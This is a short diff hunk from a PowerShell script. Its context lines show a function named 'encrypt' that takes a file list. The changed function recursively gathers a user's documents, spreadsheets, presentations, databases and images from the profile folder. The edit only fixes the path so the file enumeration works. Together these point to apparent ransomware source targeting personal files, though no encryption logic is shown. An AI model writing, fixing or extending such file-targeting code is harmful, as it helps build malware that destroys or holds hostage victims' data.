@@ -44,7 +44,7 @@ Function encrypt($keyNums, $fileList)
 
 Function fileList()
 {
-    $files = cmd /c where /r "$env:USERPROFILE\" *.txt *.xlsx *.docx *.doc *.ppt *.pptx *.accdb *.png *.jpg *.jpeg
+    $files = cmd /c where /r "$env:USERPROFILE" *.txt *.xlsx *.docx *.doc *.ppt *.pptx *.accdb *.png *.jpg *.jpeg
     $List = $files -split '\r'
     $List #return file list
 }
